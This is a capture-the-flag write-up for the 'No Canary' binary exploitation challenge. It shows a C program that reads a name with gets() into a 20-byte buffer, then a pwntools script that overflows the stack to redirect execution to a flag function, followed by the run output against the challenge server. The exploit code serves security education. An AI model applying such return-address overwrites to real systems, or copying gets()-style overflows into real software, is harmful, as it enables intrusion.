# No Canary
Binary Exploitation, 50 points

## Description
> Can you call the flag function in this [program](https://files.actf.co/244d7e58d711ecd9f1258bcdfec31119f4ebc015e6cd2067b0f8d427a7b43e3a/no_canary) ([source](https://files.actf.co/6ea07f713fcef63537e3d70e4502b8caf7c6fb0e0c751e4c3a0e514565f08f17/no_canary.c))?

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	puts("Ahhhh, what a beautiful morning on the farm!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
	puts("Wait, what? It's already noon!");
	puts("Why didn't my canary wake me up?");
	puts("Well, sorry if I kept you waiting.");
	printf("What's your name? ");

	char name[20];
	gets(name);

	printf("Nice to meet you, %s!\n", name);
}

```

Hints:

* What's dangerous about the gets function?

## Solution

The vulnerability here is *buffer overflow*:

```c
printf("What's your name? ");

	char name[20];
	gets(name);
```

We override `main`'s return address by writing 40 bytes of garbage and then the address we want, in this case `flag()`.
On my machine I had problem with `movaps` instruction so in order to allign the payload I added a ret gadget


```python
from pwn import *
import sys

context.clear(arch='amd64', os='linux')

argv = sys.argv
binary_path = './no_canary'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('shell.actf.co', 20700)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main+324
		''')

e = ELF(binary_path)

# ------------- plan -----------
# overwrite rip using bof with flag function

overflow_offset = 40
ret_gadget = 0x40101a

payload = fit({
	overflow_offset: p64(ret_gadget),
	overflow_offset + 8 : p64(e.sym['flag'])

	})

sh.sendline(payload)

print sh.recvall()
```

Output:
```console
yuvaly0@yuvalyo-blup:~/Desktop/CTFs/No_Canary_DONE$ python exploit.py remote
[+] Opening connection to shell.actf.co on port 20700: Done
[*] '/home/yuvaly0/Desktop/CTFs/No_Canary_DONE/no_canary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Receiving all data: Done (497B)
[*] Closed connection to shell.actf.co port 20700
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\x1a@!
actf{that_gosh_darn_canary_got_me_pwned!}
```